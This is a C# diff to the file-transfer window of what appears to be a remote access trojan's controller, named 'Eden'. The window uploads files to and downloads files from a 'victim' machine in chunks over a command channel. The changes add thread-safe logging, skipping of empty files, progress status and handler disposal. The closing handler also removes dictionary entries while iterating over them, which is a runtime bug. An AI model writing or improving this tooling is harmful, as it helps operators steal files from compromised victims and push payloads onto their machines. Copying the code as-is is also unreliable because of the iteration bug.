@@ -5,6 +5,7 @@ using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
+using System.Reflection.Metadata;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -23,9 +24,9 @@ namespace Eden
 
         private Queue<clsTransferFileHandler> m_qTransferFile = new Queue<clsTransferFileHandler>();
         private Dictionary<string, clsTransferFileHandler> m_dicTransferFile = new Dictionary<string, clsTransferFileHandler>();
-        private int m_nChunkSize = 1024 * 128;
-        private bool m_bPause { get; set; }
-        private bool m_bStop { get; set; }
+        private int m_nChunkSize = 1024 * 512;
+        private bool m_bPause = false;
+        private bool m_bStop = false;
 
         private int m_nThreadCnt { get; set; }
 
@@ -42,7 +43,15 @@ namespace Eden
 
             m_lszFilePath = lszFilePath;
             m_transferType = transferType;
+
+            Text = $@"File Transfer\\{victim.m_szID}";
+            StartPosition = FormStartPosition.CenterScreen;
         }
+
+        private delegate void dlgTransferFinished(clsTransferFileHandler handler);
+        private event dlgTransferFinished OnTransferFinished;
+        private delegate void dlgAllTaskFinished();
+        private event dlgAllTaskFinished OnAllTaskFinished;
 
         void fnSrvRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
         {
@@ -76,7 +85,18 @@ namespace Eden
                                     return;
                                 }
 
-                                fnSendNextChunk(handler);
+                                if (handler.m_bFinished)
+                                    handler = m_dicTransferFile.Values.First();
+
+                                switch (handler.m_enMethod)
+                                {
+                                    case clsTransferFileHandler.enMethod.Upload:
+                                        fnSendNextChunk(handler);
+                                        break;
+                                    case clsTransferFileHandler.enMethod.Download:
+                                        fnGetNextChunk(handler);
+                                        break;
+                                }
                             }
                             else
                             {
@@ -116,7 +136,18 @@ namespace Eden
                                     return;
                                 }
 
-                                fnGetNextChunk(handler);
+                                if (handler.m_bFinished)
+                                    handler = m_dicTransferFile.Values.First();
+
+                                switch (handler.m_enMethod)
+                                {
+                                    case clsTransferFileHandler.enMethod.Upload:
+                                        fnSendNextChunk(handler);
+                                        break;
+                                    case clsTransferFileHandler.enMethod.Download:
+                                        fnGetNextChunk(handler);
+                                        break;
+                                }
                             }
                             else
                             {
@@ -137,8 +168,11 @@ namespace Eden
 
         void fnWriteLog(string szMsg)
         {
-            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
-            richTextBox1.AppendText(Environment.NewLine);
+            Invoke(new Action(() =>
+            {
+                richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
         }
 
         void fnUpdateProgress(clsTransferFileHandler handler)
@@ -161,9 +195,11 @@ namespace Eden
                 {
                     item.SubItems[2].Text = "OK";
                     handler.m_bFinished = true;
+                    handler.Dispose();
                     m_dicTransferFile.Remove(handler.szRemoteFile);
 
                     toolStripProgressBar1.Increment(1);
+                    toolStripStatusLabel1.Text = $"Task[{toolStripProgressBar1.Maximum - toolStripProgressBar1.Value}]";
 
                     fnWriteLog("Completed: " + handler.m_szDstFilePath);
 
@@ -177,12 +213,13 @@ namespace Eden
         {
             if (handler.m_enMethod != clsTransferFileHandler.enMethod.Upload)
                 throw new Exception("This function is for uploading.");
-            
+
             string szRemoteFile = handler.szRemoteFile;
 
             long nRead = handler.m_nRead;
             byte[] abChunk = handler.fnReadNextChunk();
-            if (handler.m_bFinished)
+            
+            if (handler.m_bFinished && abChunk.Length == 0)
             {
                 //MessageBox.Show("OK");
                 return;
@@ -206,9 +243,9 @@ namespace Eden
                 throw new Exception("This function is for downloading.");
 
             if (handler.m_bFinished)
+            {
                 return;
-
-
+            }
 
             m_victim.fnSendCommand(new string[]
             {
@@ -244,15 +281,12 @@ namespace Eden
             //Events
             m_victim.m_clnt.ServerMessageReceived += fnSrvRecv;
 
-            toolStripProgressBar1.Maximum = m_lszFilePath.Count;
-            toolStripProgressBar1.Value = 0;
-
             //ListView init
             foreach (string szFilePath in m_lszFilePath)
             {
                 string szRemoteFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(szFilePath)).Replace("\\", "/");
-                ListViewItem item = new ListViewItem(szRemoteFilePath);
-                item.SubItems.Add(szFilePath);
+                ListViewItem item = new ListViewItem(string.Empty);
+                item.SubItems.Add(string.Empty);
                 item.SubItems.Add("?");
 
                 listView1.Items.Add(item);
@@ -270,6 +304,9 @@ namespace Eden
                 string szSrcFilePath = m_transferType == clsTransferFileHandler.enMethod.Upload ? szLocalFilePath : szRemoteFilePath;
                 string szDstFilePath = m_transferType == clsTransferFileHandler.enMethod.Upload ? szRemoteFilePath : szLocalFilePath;
 
+                item.Text = szSrcFilePath;
+                item.SubItems[1].Text = szDstFilePath;
+
                 clsTransferFileHandler handler = new clsTransferFileHandler(
                     szSrcFilePath,
                     szDstFilePath,
@@ -277,8 +314,20 @@ namespace Eden
                     m_nChunkSize
                 );
 
+                if (handler.m_nFileSize == 0 && handler.m_enMethod == clsTransferFileHandler.enMethod.Upload)
+                {
+                    MessageBox.Show($"This file is empty: {szSrcFilePath}\nSkip automatically.", "Empty File", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    listView1.Items.Remove(item);
+                    continue;
+                }
+
                 m_dicTransferFile.Add(szRemoteFilePath, handler);
             }
+
+            toolStripProgressBar1.Maximum = m_lszFilePath.Count;
+            toolStripProgressBar1.Value = 0;
+
+            toolStripStatusLabel1.Text = $"Task[{toolStripProgressBar1.Maximum - toolStripProgressBar1.Value}]";
 
             fnStart();
         }
@@ -301,7 +350,15 @@ namespace Eden
 
         private void frmFileTransfer_FormClosed(object sender, FormClosedEventArgs e)
         {
-            m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;   
+            m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;
+            
+            foreach (var key in m_dicTransferFile.Keys)
+            {
+                var handler = m_dicTransferFile[key];
+                handler.Dispose();
+                
+                m_dicTransferFile.Remove(key);
+            }
         }
 
         //Pause
